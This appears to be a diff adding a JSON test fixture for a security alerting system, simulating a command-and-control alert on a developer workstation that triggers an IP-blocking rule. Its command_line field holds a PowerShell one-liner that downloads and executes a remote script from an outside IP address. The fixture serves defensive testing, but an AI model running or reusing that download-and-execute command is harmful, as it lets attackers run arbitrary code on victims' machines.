@@ -1,0 +1,15 @@
+{
+  "_scenario": "c2_communication",
+  "_description": "Alert 02 — C2 Communication: Tiến trình kết nối tới Tor exit node 185.220.101.45 (C2, confidence=100). Trigger Rule 4: BLOCK IP.",
+  "alert_id": "a2000002-0000-0000-0000-000000000002",
+  "hostname": "WS-DEV-01",
+  "username": "minh.tran",
+  "process_name": "powershell.exe",
+  "file_path": "C:\\Users\\minh.tran\\Downloads\\helper.ps1",
+  "file_hash": "0000000000000000000000000000000000000000000000000000000000000001",
+  "parent_process": "explorer.exe",
+  "command_line": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage')",
+  "destination_ip": "185.220.101.45",
+  "severity": "high",
+  "detection_name": "Suspicious.Network.C2.Connection"
+}
